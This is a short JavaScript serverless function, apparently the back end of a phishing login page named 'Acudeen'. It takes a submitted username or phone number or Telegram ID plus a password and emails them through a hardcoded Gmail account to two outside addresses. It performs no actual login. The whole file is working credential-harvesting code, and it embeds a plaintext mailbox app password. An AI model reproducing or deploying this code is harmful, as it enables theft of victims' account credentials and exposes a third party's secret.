const nodemailer = require('nodemailer');

exports.handler = async function(event, context) {
    const { loginType, username, password } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cuentaluperonp5@gmail.com',
            pass: 'ogynqksiltkdnuoz',
        },
    });

    let subject = 'Acudeen-Inicio';
    let loginMessage = '';

    if (loginType === 'email') {
        loginMessage = `Inicio de sesión por correo electrónico\nCorreo: ${username}\nContraseña: ${password}`;
    } else if (loginType === 'phone') {
        loginMessage = `Inicio de sesión por teléfono\nNúmero: ${username}\nContraseña: ${password}`;
    } else if (loginType === 'telegram') {
        loginMessage = `Inicio de sesión por Telegram\nID de Telegram: ${username}\nContraseña: ${password}`;
    }

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com, Arihz2313@gmail.com',
        subject: subject,
        text: loginMessage,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
